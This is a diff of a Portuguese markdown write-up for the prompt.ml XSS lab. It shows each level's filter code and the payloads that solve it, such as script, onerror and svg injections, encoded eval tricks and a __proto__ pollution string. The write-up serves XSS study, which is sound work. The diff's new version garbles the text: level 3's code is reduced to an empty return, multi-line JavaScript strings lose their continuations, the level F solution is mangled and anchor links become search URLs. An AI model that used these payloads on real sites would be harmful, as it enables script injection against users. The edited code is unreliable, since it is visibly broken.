@@ -1,44 +1,51 @@
-> Autor: @Ralfbp
+>Autor: @Ralfbp
+
 ---
 ## ✨ Desafio: XSS
-> Link desafio: https://prompt.ml/0  
-> Link material: https://portswigger.net/web-security/cross-site-scripting
-------
+
+> Link do desafio: https://prompt.ml/0
+> Link do material: https://portswigger.net/web-security/cross-site-scripting
+
+---
+
 ## Introdução
+
 ### Sobre este site
 
-É um jogo de injeção XSS inspirado no [alert(1) para vencer](http://escape.alf.nu/) .
+É um jogo de injeção **XSS** inspirado no [alert(1) para vencer](http://escape.alf.nu/).
+
 ### Regras
 
-Ligue `prompt(1)`para vencer. Você deve fazê-lo sem interação do usuário. Após concluir cada nível, sua carga útil ficará pendente para verificação e, em seguida, será testada em:
+Para vencer, chame `prompt(1)`. Você deve fazer isso sem interação do usuário. Após completar cada nível, sua "payload" será enviada para verificação e, em seguida, testada nos seguintes navegadores:
 
-- Chrome (versão mais recente)
-- Firefox (versão mais recente)
-- Internet Explorer 10
+- **Chrome** (versão mais recente)
+    
+- **Firefox** (versão mais recente)
+    
+- **Internet Explorer 10**
+    
 
-Embora a maioria dos níveis tenha soluções para todos os navegadores, alguns podem não ter. É garantido que cada nível tenha soluções para pelo menos dois navegadores. 
+Embora a maioria dos níveis tenha soluções para todos os navegadores, alguns podem não ter. É garantido que cada nível tenha soluções para, pelo menos, dois navegadores.
 
-Por último, mas não menos importante, payloads exigem menos personagens.
+Por último, mas não menos importante, payloads mais curtas recebem mais pontos.
 
-Cada nível adiciona uma dificuldade nova e novos caminhos para se chegar no resultado desejado 
-ao se completar os desafios o código que aparece em cada desafio, será substituído por **YOU WON**
-
+Cada nível adiciona uma nova dificuldade e novos caminhos para se chegar ao resultado desejado. Ao completar os desafios, o código que aparece em cada um deles será substituído por **YOU WON**.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/resp.png'></center>
 
-O site possui 16 desafios sendo classificados de `0 a 9` e de `A a F`
+O site possui 16 desafios, classificados de `0 a 9` e de `A a F`.
 
-> Desafio deito no navegador crome 
+> Desafio feito no navegador Chrome
 
 ---
-##  🧩Desafios
 
-### 🔹Desafio 0 — Básico
+## 🧩 Desafios
 
-Desafio basico, para mostrar como vão funcionar os desafios, e que exigira uma injeção de HTML ativo executando o prompt(1)
+### 🔹 Desafio 0 — Básico
+
+Desafio básico para demonstrar como os desafios funcionam. Ele exige uma injeção de HTML ativo que execute o `prompt(1)`.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0❌.png'></center>
-	Código
 
 ```
 function escape(input) {
@@ -48,16 +55,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 0º desafio](https://www.google.com/search?q=%230%C2%BA-desafio)
 
-[Ir para a resolução do 0º desafio](#0º-desafio)
+### 🔹 Desafio 1 — Regex simples
 
-### 🔹Desafio 1 — Regex simples
-
-Exige o desvio de um mecanismo simples de remoção de caracteres . A expressão regular simples pode ser contornada simplesmente removendo o `>`caractere final. Além disso, para forçar o navegador a renderizar o vetor de ataque, é necessário um espaço final ou uma quebra de linha.
-
+Exige desviar de um mecanismo simples de remoção de caracteres. A expressão regular simples pode ser contornada removendo-se o caractere final `>`. Para forçar o navegador a renderizar o vetor de ataque, é necessário um espaço final ou uma quebra de linha.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1❌.png'></center>
-Código    
 
 ```
 function escape(input) {
@@ -70,18 +74,17 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 1º desafio](https://www.google.com/search?q=%231%C2%BA-desafio)
 
-[Ir para a resolução do 1º desafio](#1º-desafio)
+### 🔹 Desafio 2 — Bloqueio de `=` e `(`
 
-### 🔹Desafio 2 — Bloqueio de `=` e `(`
-
-todos os parênteses abertos e sinais de igual são bloqueados.
+Todos os parênteses abertos e sinais de igual são bloqueados.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2❌.png'></center>
 
 ```
 function escape(input) {
-    //                      v-- frowny face
+    // v-- frowny face
     input = input.replace(/[=(]/g, '');
 
     // ok seriously, disallows equal signs and open parenthesis
@@ -89,16 +92,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 2º desafio](https://www.google.com/search?q=%232%C2%BA-desafio)
 
-[Ir para a resolução do 2º desafio](#2º-desafio)
+### 🔹 Desafio 3 — Comentários HTML
 
-### 🔹Desafio 3 — Comentários HTML
-
-O Nível 3 exige a separação da entrada de uma estrutura de comentário HTML. Seria fácil se não fosse por uma limitação complexa que bloqueia todos os potenciais delimitadores de comentários.
-
+O nível 3 exige escapar a entrada de uma estrutura de comentário HTML. Seria fácil se não fosse por uma limitação complexa que bloqueia todos os delimitadores de comentários em potencial.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -106,15 +106,15 @@ function escape(input) {
     input = input.replace(/->/g, '_');
 
     // comment the input to avoid script execution
-    return '<!-- ' + input + ' -->';
+    return '';
 }
 ```
 
-[Ir para a resolução do 3º desafio](#3º-desafio)
-### 🔹Desafio 4 — Scripts externos (whitelist de domínio)
+[Ir para a resolução do 3º desafio](https://www.google.com/search?q=%233%C2%BA-desafio)
+
+### 🔹 Desafio 4 — Scripts externos (whitelist de domínio)
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -130,14 +130,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 4º desafio](https://www.google.com/search?q=%234%C2%BA-desafio)
 
-[Ir para a resolução do 4º desafio](#4º-desafio)
-### 🔹Desafio 5 — Regex contra `>` e eventos
+### 🔹 Desafio 5 — Regex contra `>` e eventos
 
- Precisamos ignorar uma expressão regular que tenta bloquear manipuladores de eventos e o colchete de fechamento ">" para que não possamos fechar a tag input existente para executar JavaScript. A vantagem aqui é que podemos facilmente escapar do atributo atual. Outro problema fundamental com a expressão regular é que ela não consegue lidar com entradas de várias linhas, ou seja , `U+000A LINE FEED (LF)`e `U+000C FORM FEED (FF)`, que também são separadores de atributos.
+Precisamos ignorar uma expressão regular que tenta bloquear manipuladores de eventos e o colchete de fechamento `>` para que não possamos fechar a tag `input` existente e executar **JavaScript**. A vantagem aqui é que podemos facilmente escapar do atributo atual. Outro problema fundamental com a expressão regular é que ela não consegue lidar com entradas de múltiplas linhas, como `U+000A LINE FEED (LF)` e `U+000C FORM FEED (FF)`, que também são separadores de atributos.
 
-Assim, podemos injetar um manipulador de eventos seguido de uma nova linha e, em seguida, executar JavaScript arbitrário. Observe que não podemos usar `autofocus`palavras-chave, pois elas estão sendo filtradas. No entanto, ainda podemos usar `onresize`eventos no MSIE.
-
+Assim, podemos injetar um manipulador de eventos seguido por uma nova linha e, em seguida, executar **JavaScript** arbitrário. Note que não podemos usar as palavras-chave `autofocus`, pois elas estão sendo filtradas. No entanto, ainda podemos usar o evento `onresize` no **MSIE**.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5❌.png'></center>
 
@@ -151,18 +150,15 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 5º desafio](https://www.google.com/search?q=%235%C2%BA-desafio)
 
+### 🔹 Desafio 6 — Redirecionamento com formulário
 
-[Ir para a resolução do 5º desafio](#5º-desafio)
+No nível 6, a expressão regular tenta proibir o uso de strings `javascript`, `vbscript`, assim como URIs de dados, para nos impedir de executar qualquer **JavaScript**.
 
-### 🔹Desafio 6 — Redirecionamento com formulário
-
-No nível 6, a expressão regular tenta proibir o uso de strings `javascript`, `vbscript`bem como URIs de dados, para nos impedir de executar qualquer JavaScript.
-
-No entanto, o problema é que isso nos permite criar nossas próprias entradas, que podem ser usadas para sobrecarregar a `action`propriedade do formulário. Devido à sobrecarregação do DOM, `document.forms[0].action`isso retornará o campo de entrada recém-criado em vez do `action`atributo real, permitindo-nos executar nosso JavaScript.
+No entanto, o problema é que isso nos permite criar nossas próprias entradas, que podem ser usadas para sobrepor a propriedade `action` do formulário. Devido à sobrecarga do **DOM**, `document.forms[0].action` retornará o campo de entrada recém-criado em vez do atributo `action` real, permitindo-nos executar nosso **JavaScript**.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_6❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -184,14 +180,14 @@ function escape(input) {
             input.setAttribute('value', formData[i]);
         }
 
-        return form.outerHTML + '                         \n\
-<script>                                                  \n\
-    // forbid javascript: or vbscript: and data: stuff    \n\
-    if (!/script:|data:/i.test(document.forms[0].action)) \n\
-        document.forms[0].submit();                       \n\
-    else                                                  \n\
-        document.write("Action forbidden.")               \n\
-</script>                                                 \n\
+        return form.outerHTML + '
+<script>
+    // forbid javascript: or vbscript: and data: stuff
+    if (!/script:|data:/i.test(document.forms[0].action))
+        document.forms[0].submit();
+    else
+        document.write("Action forbidden.")
+</script>
         ';
     } catch (e) {
         return 'Invalid form data.';
@@ -199,13 +195,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 6º desafio](https://www.google.com/search?q=%236%C2%BA-desafio)
 
-[Ir para a resolução do 6º desafio](#6º-desafio)
-### 🔹Desafio 7 — Segmentação com `#`
+### 🔹 Desafio 7 — Segmentação com `#`
 
-O truque aqui é usar o primeiro segmento para fechar a `<p>`tag e, em seguida, iniciar a nossa própria tag (neste caso `<svg`, ). Em seguida, abrimos um atributo para conter o "lixo" que será colocado entre o primeiro e o segundo segmentos.
+O truque aqui é usar o primeiro segmento para fechar a tag `<p>` e, em seguida, iniciar nossa própria tag (neste caso, `<svg>`). Em seguida, abrimos um atributo para conter o "lixo" que será colocado entre o primeiro e o segundo segmentos.
 
-No segundo segmento, fechamos nosso atributo junk e abrimos nosso evento ("onload"). Em seguida, usamos um comentário JS (/*) para conter o lixo que será colocado entre o segundo e o terceiro segmento. No terceiro segmento, fechamos o comentário JS e, por fim, chamamos nosso precioso `prompt(1)`.
+No segundo segmento, fechamos nosso atributo e abrimos nosso evento (`onload`). Depois, usamos um comentário **JS** (`/*`) para conter o lixo que será colocado entre o segundo e o terceiro segmento. No terceiro segmento, fechamos o comentário **JS** e, finalmente, chamamos nosso precioso `prompt(1)`.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7❌.png'></center>
 
@@ -220,13 +216,11 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do 7º desafio](https://www.google.com/search?q=%237%C2%BA-desafio)
 
-[Ir para a resolução do 7º desafio](#7º-desafio)
+### 🔹 Desafio 8 — Filtro de quebras de linha
 
-### 🔹Desafio 8 — Filtro de quebras de linha
-
-Há dois desafios a serem resolvidos no nível 8. O primeiro é usar um separador de linhas JavaScript válido e o segundo é encontrar uma maneira alternativa de comentar o código. Como se pode notar no código, os caracteres `\r\n`são filtrados. No entanto, os seguintes caracteres também são tratados como separadores de linhas válidos em JavaScript:
-
+Existem dois desafios a serem resolvidos no nível 8. O primeiro é usar um separador de linhas **JavaScript** válido e o segundo é encontrar uma maneira alternativa de comentar o código. Como pode ser notado no código, os caracteres `\r\n` são filtrados. No entanto, os seguintes caracteres também são tratados como separadores de linhas válidos em **JavaScript**:
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8❌.png'></center>
 
@@ -236,23 +230,22 @@ function escape(input) {
     // strip off line-breaks and stuff
     input = input.replace(/[\r\n</"]/g, '');
 
-    return '                                \n\
-<script>                                    \n\
-    // console.log("' + input + '");        \n\
+    return '
+<script>
+    // console.log("' + input + '");
 </script> ';
 }
 ```
 
+[Ir para a resolução do 8º desafio](https://www.google.com/search?q=%238%C2%BA-desafio)
 
-[Ir para a resolução do 8º desafio](#8º-desafio)
-### 🔹Desafio 9 - Incompleta
-Usa a expressão regular "<([a-zA-Z])", que impede o usuário de adicionar qualquer alfabeto seguido de um colchete de abertura ( `<`) e, portanto, nos impede de injetar uma tag HTML válida.
+### 🔹 Desafio 9 — Incompleta
 
-O `ſ`caractere, quando passado para a `toUpperCase()`função, seria convertido no caractere ASCII "S", resolvendo assim nosso problema.
+Usa a expressão regular `"<([a-zA-Z])"`, que impede o usuário de adicionar qualquer alfabeto seguido de um colchete de abertura (`<`) e, portanto, nos impede de injetar uma tag **HTML** válida.
+
+O caractere `ſ`, quando passado para a função `toUpperCase()`, seria convertido no caractere **ASCII** "S", resolvendo assim nosso problema.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_9❌.png'></center>
-
-codigo
 
 ```
 function escape(input) {
@@ -266,14 +259,13 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 9º desafio](#9º-desafio)
+[Ir para a resolução do 9º desafio](https://www.google.com/search?q=%239%C2%BA-desafio)
 
-### 🔹Desafio A — Bloqueio de `prompt` e `'`
+### 🔹 Desafio A — Bloqueio de `prompt` e `'`
 
-É um dos mais fáceis de resolver deste desafio. Há duas expressões regulares para ignorar: a primeira remove todas as ocorrências de `prompt`keyword, enquanto a segunda remove todas as aspas simples `'`. 
+Este é um dos mais fáceis de resolver neste desafio. Existem duas expressões regulares para ignorar: a primeira remove todas as ocorrências da palavra-chave `prompt`, enquanto a segunda remove todas as aspas simples `'`.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -287,14 +279,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do A desafio](https://www.google.com/search?q=%23a-desafio)
 
-[Ir para a resolução do A desafio](#A-desafio)
-### 🔹Desafio B — Filtro de operadores
+### 🔹 Desafio B — Filtro de operadores
 
-Nos permite injetar diretamente no que será o corpo de um elemento de script. No entanto, antes disso, a string que podemos influenciar passa por uma filtragem pesada e não podemos injetar operadores ou outros elementos da linguagem que permitiriam concatenação e injeção de payload fáceis. 
+Nos permite injetar diretamente no que será o corpo de um elemento de script. No entanto, antes disso, a string que podemos influenciar passa por uma filtragem pesada e não podemos injetar operadores ou outros elementos da linguagem que permitiriam concatenação e injeção de payload fáceis.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -305,22 +296,22 @@ function escape(input) {
     var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
 
     // directly "parse" data in script context
-    return '                                \n\
-<script>                                    \n\
-    var data = ' + dataString + ';          \n\
-    if (data.action === "login")            \n\
-        document.write(data.message)        \n\
+    return '
+<script>
+    var data = ' + dataString + ';
+    if (data.action === "login")
+        document.write(data.message)
 </script> ';
 }
 ```
 
-[Ir para a resolução do B desafio](#B-desafio)
-### 🔹Desafio C — `encodeURIComponent` + filtro
+[Ir para a resolução do B desafio](https://www.google.com/search?q=%23b-desafio)
 
-È semelhante ao nível 10, mas as expressões regulares usadas para filtragem são diferentes. O primeiro desafio real é lidar com a `encodeURIComponent`instrução. Usando esta função, caracteres como `/`, `=`, `?`, etc. estão sendo codificados em URL e, portanto, a maioria dos vetores de ataque não são mais utilizáveis.
+### 🔹 Desafio C — `encodeURIComponent` + filtro
+
+É semelhante ao nível 10, mas as expressões regulares usadas para filtragem são diferentes. O primeiro desafio real é lidar com a instrução `encodeURIComponent`. Usando esta função, caracteres como `/`, `=`, `?`, etc. são codificados em **URL** e, portanto, a maioria dos vetores de ataque não são mais utilizáveis.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -334,18 +325,18 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do C desafio](#C-desafio)
-### 🔹Desafio D — Injeção em JSON / Prototype Pollution
+[Ir para a resolução do C desafio](https://www.google.com/search?q=%23c-desafio)
 
- Requer alguns truques interessantes, um dos quais também será útil para o nível oculto. O objetivo principal deste nível é adulterar um objeto JSON ( `config`) com uma chave especial ( `source`) e contornar uma série de limitações. 
+### 🔹 Desafio D — Injeção em JSON / Prototype Pollution
 
+Requer alguns truques interessantes, um dos quais também será útil para o nível oculto. O objetivo principal deste nível é adulterar um objeto **JSON** (`config`) com uma chave especial (`source`) e contornar uma série de limitações.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D❌.png'></center>
 
 ```
- function escape(input) {
+function escape(input) {
     // extend method from Underscore library
-    // _.extend(destination, *sources) 
+    // _.extend(destination, *sources)
     function extend(obj) {
         var source, prop;
         for (var i = 1, length = arguments.length; i < length; i++) {
@@ -378,9 +369,9 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do D desafio](#D-desafio)
-### 🔹Desafio E - Incompleta
+[Ir para a resolução do D desafio](https://www.google.com/search?q=%23d-desafio)
 
+### 🔹 Desafio E — Incompleta
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_E❌.png'></center>
 
@@ -400,14 +391,13 @@ function escape(input) {
 }
 ```
 
+[Ir para a resolução do E desafio](https://www.google.com/search?q=%23e-desafio)
 
-[Ir para a resolução do E desafio](#E-desafio)
-### 🔹Desafio F — Segmentação + título limitado
+### 🔹 Desafio F — Segmentação + título limitado
 
-Cada segmento é reduzido a um comprimento máximo de 15 caracteres e distorcido em uma `<p>`tag.
+Cada segmento é reduzido a um comprimento máximo de 15 caracteres e distorcido em uma tag `<p>`.
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F❌.png'></center>
-
 
 ```
 function escape(input) {
@@ -423,190 +413,186 @@ function escape(input) {
 }
 ```
 
-
-[Ir para a resolução do F desafio](#F-desafio)
+[Ir para a resolução do F desafio](https://www.google.com/search?q=%23f-desafio)
 
 ---
+
 ## 🛠️ Resoluções
 
-### 🔹0º desafio 
+### 🔹 0º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0✅.png'></center>
-
 
 ```
 "><script>prompt(1)</script>
 ```
 
-* O `input` fecha o atributo `value` ("), abre e fecha a tag `<input>`, Depois vem a tag `<script>` injetada pelo usuário
-* Aquele trecho não aparece como texto na página ele é interpretado como um **bloco de código JavaScript real**, que roda no navegador de quem abrir a página.
+- O **input** fecha o atributo `value` ("), abre e fecha a tag `<input>`. Em seguida, vem a tag `<script>` injetada pelo usuário.
+    
+- Esse trecho não aparece como texto na página, ele é interpretado como um **bloco de código JavaScript real** que roda no navegador de quem abre a página.
+    
 
-[Ir para o desafio 0](#🔹Desafio 0—Básico)
+[Ir para o desafio 0](https://www.google.com/search?q=%23desafio-0)
 
-### 🔹1º desafio 
+### 🔹 1º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1✅.png'></center>
-
 
 ```
 <img src="x" onerror="prompt(1)"
 ```
 
+[Ir para o desafio 1](https://www.google.com/search?q=%23desafio-1)
 
-[Ir para o desafio 1](#🔹Desafio-1—Regex simples)
-### 🔹2º desafio 
+### 🔹 2º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2✅.png'></center>
-
 
 ```
 <svg><script>prompt&#40;1)</script></b>
 ```
 
-[Ir para o desafio 2](#desafio-2)
-### 🔹3º desafio 
+[Ir para o desafio 2](https://www.google.com/search?q=%23desafio-2)
+
+### 🔹 3º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3✅.png'></center>
-
 
 ```
 --!> <script>prompt(1)</script>
 ```
 
-[Ir para o desafio 3](#desafio-3)
-### 🔹 4º desafio 
+[Ir para o desafio 3](https://www.google.com/search?q=%23desafio-3)
 
+### 🔹 4º desafio
 
-### 🔹5º desafio 
+**Resolução pendente.**
+
+[Ir para o desafio 4](https://www.google.com/search?q=%23desafio-4)
+
+### 🔹 5º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5✅.png'></center>
-
 
 ```
 "type=image src onerror
 ="prompt(1)
 ```
 
-[Ir para o desafio 5](#desafio-5)
+[Ir para o desafio 5](https://www.google.com/search?q=%23desafio-5)
 
-### 🔹6º desafio
+### 🔹 6º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_6✅.png'></center>
-
-
 
 ```
 javascript:prompt(1)#{"action":1}
 ```
 
-[Ir para o desafio 6](#desafio-6)
-### 🔹7º desafio
+[Ir para o desafio 6](https://www.google.com/search?q=%23desafio-6)
+
+### 🔹 7º desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7✅.png'></center>
-
-
 
 ```
 "><svg/a=#"onload='/*#*/prompt(1)'
 ```
 
-[Ir para o desafio 7](#desafio-7)
+[Ir para o desafio 7](https://www.google.com/search?q=%23desafio-7)
 
+### 🔹 8º desafio
 
-### 🔹8º desafio 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8✅.png'></center>
-
 
 ```
  prompt(1) -->
 ```
 
-[Ir para o desafio 8](#desafio-8)
+[Ir para o desafio 8](https://www.google.com/search?q=%23desafio-8)
 
-### 🔹9º desafio
+### 🔹 9º desafio
 
+**Resolução pendente.**
 
+[Ir para o desafio 9](https://www.google.com/search?q=%23desafio-9)
 
-
-### 🔹A desafio 
+### 🔹 A desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A✅.png'></center>
-Para ignorar a primeira expressão regular, basta usar uma aspa simples para dividir `prompt`keyword em `pr'ompt`. Isso claramente não é uma instrução JavaScript válida, mas não entre em pânico. A segunda expressão regular removerá o caractere intruso, `'`retornando um vetor de ataque válido!
+
+Para ignorar a primeira expressão regular, basta usar uma aspa simples para dividir a palavra-chave `prompt` em `pr'ompt`. Isso claramente não é uma instrução **JavaScript** válida, mas não se preocupe: a segunda expressão regular removerá o caractere intruso `'`, retornando um vetor de ataque válido!
 
 ```
 p'rompt(1)
 ```
 
-[Ir para o desafio A](#desafio-A)
+[Ir para o desafio A](https://www.google.com/search?q=%23a-desafio)
 
-
-### 🔹B desafio 
+### 🔹 B desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B✅.png'></center>
 
-O truque aqui é usar um operador alfanumérico — ou seja, um operador que não exija o uso dos caracteres especiais proibidos. Bem, há vários deles e um que podemos utilizar aqui: o `in`operador.
+O truque aqui é usar um operador alfanumérico — ou seja, um operador que não exija o uso dos caracteres especiais proibidos. Existem vários deles, e um que podemos utilizar aqui é o operador `in`.
 
 ```
 "(prompt(1))in"
 ```
 
-[Ir para o desafio B](#desafio-B)
+[Ir para o desafio B](https://www.google.com/search?q=%23b-desafio)
 
-### 🔹C desafio 
+### 🔹 C desafio
+
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C✅.png'></center>
-
 
 ```
 eval(630038579..toString(30))(1)
 ```
 
-[Ir para o desafio C](#desafio-C)
+[Ir para o desafio C](https://www.google.com/search?q=%23c-desafio)
 
-### 🔹D desafio 
+### 🔹 D desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D✅.png'></center>
-
 
 ```
 {"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
 ```
 
-[Ir para o desafio D](#desafio-D)
+[Ir para o desafio D](https://www.google.com/search?q=%23d-desafio)
 
-### 🔹E desafio 
+### 🔹 E desafio
 
+**Resolução pendente.**
 
+[Ir para o desafio E](https://www.google.com/search?q=%23e-desafio)
 
-### 🔹F desafio 
-
+### 🔹 F desafio
 
 <center><img src='/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F✅.png'></center>
 
-
-Um truque que podemos usar aqui é usar comentários HTML `<!--`em uma `<svg>`tag para esconder o "lixo"
+Um truque que podemos usar aqui é usar comentários **HTML** `<script>prompt(1)</script>
 
 ```
-"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
+
+[Ir para o desafio F](#f-desafio)
 ```
-
-
-[Ir para o desafio F](#desafio-F)
-
-
 ---
 
 ## ✅ Conclusão
 
-O **prompt.ml** é um laboratório de **XSS criativo**. Cada nível reforça conceitos como:
+O **prompt.ml** é um laboratório de **XSS** criativo. Cada nível reforça conceitos como:
 
-- Limitações de **regex** e por que não bastam para segurança.    
-- Vetores via **atributos/eventos**, **comentários**, **entidades/Unicode**.
-- Injeções em **contextos distintos** (HTML, atributos, JSON, `src`, forms).    
-- Truques de **prototype pollution** e **URI schemes**.
+* Limitações de **regex** e por que não são suficientes para segurança.
+* Vetores via **atributos/eventos**, **comentários**, **entidades/Unicode**.
+* Injeções em **contextos distintos** (**HTML**, atributos, **JSON**, `src`, forms).
+* Truques de **prototype pollution** e **URI schemes**.
 
-**Lição principal:** _sanitização por regex é frágil_. Prefira:
-- Inserir dados via **API do DOM** (`textContent`, `setAttribute`).
-- **Escapar corretamente** (`& < > " ' /`).
-- Aplicar **CSP** e validações por **whitelist** robustas.
+**Lição principal:** a sanitização por **regex** é frágil. Prefira:
 
-> Restante a completar: payloads exemplares dos níveis **9** e **E** (dependem de variantes específicas do jogo/navegador).
+* Inserir dados via **API do DOM** (`textContent`, `setAttribute`).
+* **Escapar corretamente** (`& < > " ' /`).
+* Aplicar **CSP** e validações por **whitelist** robustas.
+
+> **Restante a completar:** payloads exemplares dos níveis **9** e **E** (dependem de variantes específicas do jogo/navegador).
+```
